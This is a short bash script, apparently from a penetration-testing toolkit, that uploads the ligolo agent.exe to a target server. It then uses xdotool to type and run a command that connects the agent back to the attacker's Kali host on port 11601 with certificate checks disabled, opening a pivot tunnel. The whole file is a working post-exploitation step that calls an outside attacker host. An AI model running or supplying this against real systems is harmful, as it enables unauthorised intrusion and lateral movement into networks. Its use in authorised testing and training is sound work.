#!/bin/bash

: '
cmd: download ligolo agent.exe to server and connect to proxy
'

LOCATION="${SCRIPTS_DIR}/portListening/ligolo/.files"
FILE="agent.exe"

cmd_upload_file "${LOCATION}" "${FILE}"

paste_command "${FILE_LOCATION} -connect ${KALI_IP}:11601 -ignore-cert"
xdotool key Return
